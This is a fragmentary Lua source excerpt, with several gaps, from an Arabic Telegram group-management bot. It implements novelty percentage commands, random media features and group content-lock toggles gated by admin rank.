if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ☆" and DevALS:get(AFS..'AnothaNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevALS:del(AFS..'AnothaNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(AFS..'StupidNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ☆" and DevALS:get(AFS..'StupidNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevALS:del(AFS..'StupidNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل حساب العمر'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Age:ALS'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل حساب العمر'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Age:ALS'..msg.chat_id_,true)  
end
if not DevALS:get(AFS..'ALS:Age:ALS'..msg.chat_id_) then
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Mean:ALS'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل معاني الاسماء'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Mean:ALS'..msg.chat_id_,true)  
end
if not DevALS:get(AFS..'ALS:Mean:ALS'..msg.chat_id_) then
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل المتحركه'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:gif:ALS'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل المتحركه'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:gif:ALS'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ☆") and not DevALS:get(AFS..'ALS:gif:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,1075); 
local Text ='*☆︙تم اختيار المتحركه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/gif:"..msg.sender_user_id_}},{{text = '☆ AFS Team .',url="t.me/CXRCX"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الميمز'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:memz:ALS'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الميمز'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:memz:ALS'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ☆") and not DevALS:get(AFS..'ALS:memz:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,1201); 
local Text ='*☆︙تم اختيار مقطع الميمز لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/memz:"..msg.sender_user_id_}},{{text = '☆ AFS Team .',url="t.me/CXRCX"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل غنيلي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Audios:ALS'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل غنيلي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Audios:ALS'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ☆") and not DevALS:get(AFS..'ALS:Audios:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(4,2824); 
local Text ='*☆︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/Song:"..msg.sender_user_id_}},{{text = '☆ AFS Team .',url="t.me/CXRCX"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الاغاني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:mp3:ALS'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الاغاني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:mp3:ALS'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ☆" or text == "اغاني") and not DevALS:get(AFS..'ALS:mp3:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,1167); 
local Text ='*☆︙تم اختيار الاغنيه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/mp3:"..msg.sender_user_id_}},{{text = '☆ AFS Team .',url="t.me/CXRCX"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الريمكس'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Remix:ALS'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الريمكس'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Remix:ALS'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ☆") and not DevALS:get(AFS..'ALS:Remix:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,612); 
local Text ='*☆︙تم اختيار الريمكس لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/remix:"..msg.sender_user_id_}},{{text = '☆ AFS Team .',url="t.me/CXRCX"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الصوره'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Photo:ALS'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الصوره'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Photo:ALS'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ☆") and not DevALS:get(AFS..'ALS:Photo:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(4,1171); 
local Text ='*☆︙تم اختيار الصوره لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/photo:"..msg.sender_user_id_}},{{text = '☆ AFS Team .',url="t.me/CXRCX"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الانمي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Anime:ALS'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and ChCheck(msg) or text == "تعطيل الانمي" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الانمي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Anime:ALS'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ☆") and not DevALS:get(AFS..'ALS:Anime:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(3,1002); 
local Text ='*☆︙تم اختيار صورة الانمي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/anime:"..msg.sender_user_id_}},{{text = '☆ AFS Team .',url="t.me/CXRCX"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الافلام'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Movies:ALS'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الافلام'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Movies:ALS'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ☆") and not DevALS:get(AFS..'ALS:Movies:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(45,125); 
local Text ='*☆︙تم اختيار الفلم لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/Movies:"..msg.sender_user_id_}},{{text = '☆ AFS Team .',url="t.me/CXRCX"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل المسلسلات'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Series:ALS'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل المسلسلات'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Series:ALS'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ☆") and not DevALS:get(AFS..'ALS:Series:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,54); 
local Text ='*☆︙تم اختيار المسلسل لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/series:"..msg.sender_user_id_}},{{text = '☆ AFS Team .',url="t.me/CXRCX"}}} 
local msg_id = msg.id_/2097152/0.5 
...
--     Source AFS     --
if Admin(msg) then
if DevALS:get(AFS..'ALS:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevALS:get(AFS..'ALS:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الروابط ↫ "..mute_links.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevALS:get(AFS..'ALS:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local AFSTeam = "\n" .."☆︙المعرف ↫ "..lock_tag.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevALS:get(AFS..'ALS:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local AFSTeam = "\n" .."☆︙المتحركه ↫ "..mute_gifs.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الملصقات" then if DevALS:get(AFS..'ALS:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الملصقات ↫ "..lock_sticker.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الصور" then if DevALS:get(AFS..'ALS:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الصور ↫ "..mute_photo.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevALS:get(AFS..'ALS:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الفيديو ↫ "..mute_video.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الاونلاين" then if DevALS:get(AFS..'ALS:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local AFSTeam = "\n" .."☆︙الاونلاين ↫ "..mute_in.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الدردشه" then if DevALS:get(AFS..'ALS:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الدردشه ↫ "..mute_text.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevALS:get(AFS..'ALS:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local AFSTeam = "\n" .."☆︙التوجيه ↫ "..lock_forward.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الاغاني" then if DevALS:get(AFS..'ALS:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الاغاني ↫ "..mute_music.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevALS:get(AFS..'ALS:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local AFSTeam = "\n" .."☆︙الصوت ↫ "..mute_voice.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevALS:get(AFS..'ALS:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الجهات ↫ "..lock_contact.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الماركداون" then if DevALS:get(AFS..'ALS:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local AFSTeam = "\n" .."☆︙الماركداون ↫ "..markdown.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الهاشتاك" then if DevALS:get(AFS..'ALS:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local AFSTeam = "\n" .."☆︙الهاشتاك ↫ "..lock_htag.."\n"Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "التعديل" then if DevALS:get(AFS..'ALS:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local AFSTeam = "\n" .."☆︙التعديل ↫ "..mute_edit.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "التثبيت" then if DevALS:get(AFS..'ALS:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local AFSTeam = "\n" .."☆︙التثبيت ↫ "..lock_pin.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الاشعارات" then if DevALS:get(AFS..'ALS:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الكلايش" then if DevALS:get(AFS..'ALS:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الكلايش ↫ "..lock_spam.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الدخول" then if DevALS:get(AFS..'ALS:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local AFSTeam = "\n" .."☆︙الدخول ↫ "..lock_Join.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الشبكات" then if DevALS:get(AFS..'ALS:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الشبكات ↫ "..lock_wp.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "المواقع" then if DevALS:get(AFS..'ALS:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local AFSTeam = "\n" .."☆︙المواقع ↫ "..lock_location.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "العربيه" then if DevALS:get(AFS..'ALS:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local AFSTeam = "\n" .."☆︙العربيه ↫ "..lock_arabic.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الانكليزيه" then if DevALS:get(AFS..'ALS:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local AFSTeam = "\n" .."☆︙الانكليزيه ↫ "..lock_english.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الكفر" then if DevALS:get(AFS..'ALS:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local AFSTeam = "\n" .."☆︙الكفر ↫ "..lock_kaf.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الفشار" then if DevALS:get(AFS..'ALS:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local AFSTeam = "\n" .."☆︙الفشار ↫ "..lock_fshar.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
if text == "الطائفيه" then if DevALS:get(AFS..'ALS:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local AFSTeam = "\n" .."☆︙الطائفيه ↫ "..lock_taf.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam, 1, 'md') end
end
--     Source AFS     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل كشف الاعدادات'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل كشف الاعدادات'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:LockSettings'..msg.chat_id_) 
end
--     Source AFS     --
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:Robot'..msg.chat_id_)
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:Robot'..msg.chat_id_,true)
end
--     Source AFS     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل ردود المدير'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل ردود المدير'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:GpRed'..msg.chat_id_,true)
end
--     Source AFS     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل ردود المطور'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل ردود المطور'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:AllRed'..msg.chat_id_,true)
end
--     Source AFS     --
if ALSSudo(msg) then
...
--     Source AFS     --
if msg.content_.photo_ then
if DevALS:get(AFS..'ALS:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
DevALS:del(AFS..'ALS:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"☆︙ليست لدي صلاحية تغير معلومات الكروب يرجى التحقق من الصلاحيات") 
DevALS:del(AFS..'ALS:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
...
Dev_ALS(msg.chat_id_,msg.id_, 1, '☆︙ارسل صورة الكروب الان', 1, 'md')
DevALS:set(AFS..'ALS:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source AFS     --
...
if data.ID == "Ok" then
DevALS:del(AFS..'ALS:PinnedMsg'..msg.chat_id_)
...
local PinId = DevALS:get(AFS..'ALS:PinnedMsg'..msg.chat_id_)
if PinId then
...
Dev_ALS(msg.chat_id_, msg.id_, 0,'☆︙*ماكو محظورين*', 1, 'md')
DevALS:del(AFS..'ALS:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = DevALS:scard(AFS.."ALS:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = DevALS:scard(AFS.."ALS:Constructor:"..ChatId) or 0
local BanedList = DevALS:scard(AFS.."ALS:Ban:"..ChatId) or 0
local ManagerList = DevALS:scard(AFS.."ALS:Managers:"..ChatId) or 0
local MutedList = DevALS:scard(AFS.."ALS:Muted:"..ChatId) or 0
local TkeedList = DevALS:scard(AFS.."ALS:ALS:Tkeed:"..ChatId) or 0
local AdminsList = DevALS:scard(AFS.."ALS:Admins:"..ChatId) or 0
local VipList = DevALS:scard(AFS.."ALS:VipMem:"..ChatId) or 0
...
DevALS:set(AFS..'ALS:Num:Add:Bot',Num) 
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:FreeBot'..AFS) 
end 
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:FreeBot'..AFS,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل صورتي بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الالعاب بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الالعاب بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:Games'..msg.chat_id_,true)  
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:Gamesinline'..msg.chat_id_) 
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS.."ALS:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS.."ALS:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS.."ALS:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
if text and (text == "تفعيل حذف الردود" or text == "تفعيل مسح الردود") and ChCheck(msg) then 
if not ALSConstructor(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙لمالك الكروب او اعلى فقط ', 1, 'md')
else
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل حذف ردود المدير'
